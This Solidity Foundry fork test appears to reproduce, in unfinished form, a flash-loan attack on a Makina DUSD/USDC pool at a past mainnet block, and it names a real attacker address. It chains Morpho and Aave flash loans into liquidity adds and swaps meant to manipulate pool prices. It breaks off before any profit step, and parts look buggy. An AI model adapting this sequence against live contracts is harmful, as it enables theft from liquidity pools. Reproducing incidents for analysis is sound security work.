// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Attack} from "../src/AttackContract.sol";
// Simple interface to check balances
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address account, uint256 value) external;
}
interface Morpho{
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}
interface AavePool{
    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes calldata params, uint16 referralCode) external;
}
interface IMakina {
    function add_liquidity(uint256[] memory _amounts, uint256 min_amount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
}

contract MakinaForkTest is Test {
    // 1. Define the addresses
    address constant DUSD = 0x1e33E98aF620F1D563fcD3cfd3C75acE841204ef; 
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant ATTACKER = 0x935bfb495E33f74d2E9735DF1DA66acE442ede48;
    uint256 constant BLOCK_NUMBER = 24273361;
    address constant MORPHO_ADDRESS = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant AAVE_POOL_ADDRESS = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant underlying = 0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c;
    address CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address mim_crv = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B; 
    Attack public attack;
    uint256 dusd_usddc_liquidity = 100*1e12;
    uint256 Curve_liquidity = 170*1e12;
    uint256 constant dusd_usdc_exchange = 10*1e12;
    address constant DUSDUSDC = 0x32E616F4f17d43f9A5cd9Be0e294727187064cb3;
    address Curve_DCT= 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    uint256 mim_crv_liquidity = 15*1e24;
    function setUp() public {
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        vm.createSelectFork(rpcUrl, BLOCK_NUMBER); 
        attack = new Attack();
    }

    function testStateAtFork() public {
        assertEq(block.number, BLOCK_NUMBER);
    }
    function allowance() internal {
        IERC20(USDC).approve(DUSDUSDC, type(uint256).max);
        IERC20(Curve_DCT).approve(DUSDUSDC, type(uint256).max);
        IERC20(CRV).approve(mim_crv, type(uint256).max);
    }

    function testcallFlashLoan() public {
        uint256 mophoBalance = IERC20(USDC).balanceOf(MORPHO_ADDRESS);
        console.log("Mopho balance:", mophoBalance/1e6);
        console.log("DUSDUSDC pool balance:", IERC20(USDC).balanceOf(DUSDUSDC)/1e6);
        console.log("bal;ance of underlying contract", IERC20(USDC).balanceOf(underlying)/1e6);
        bytes memory data = abi.encode(1111, "zabi");
        Morpho(MORPHO_ADDRESS).flashLoan(USDC, mophoBalance, data);
    }

    function onMorphoFlashLoan(uint256 amount, bytes memory data) public returns (bool) {
        require(msg.sender == MORPHO_ADDRESS, "Not Morpho");
        console.log("Funds received", amount, string(data));
        AavePool(AAVE_POOL_ADDRESS).flashLoanSimple(address(this), USDC, 120*1e6*1e6, data, 0);
        return true;
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 totalPremium,
        address user,
        bytes memory params
      ) public returns (bool) {
        allowance();
        // ------
        console.log("balance:", IERC20(USDC).balanceOf(address(this))/1e6);
        uint256[] memory _amounts = new uint256[](2);
        _amounts[0] = dusd_usddc_liquidity;
        _amounts[1] = 0;
        IMakina(DUSDUSDC).add_liquidity(_amounts, 0);
        IMakina(DUSDUSDC).exchange(0, 1, dusd_usdc_exchange, 0);
        console.log("dusd balance", IERC20(DUSD).balanceOf(address(this))/1e18);
        // -----
        uint256[] memory amounts_curve = new uint256[](3);
        amounts_curve[0] = 0;
        amounts_curve[1] = Curve_liquidity;
        amounts_curve[2] = 0;
        IMakina(Curve_DCT).add_liquidity(_amounts, 0);
        IMakina(mim_crv).add_liquidity(_amounts, 0);
        // ------ line 440








        return true;
    }

    
}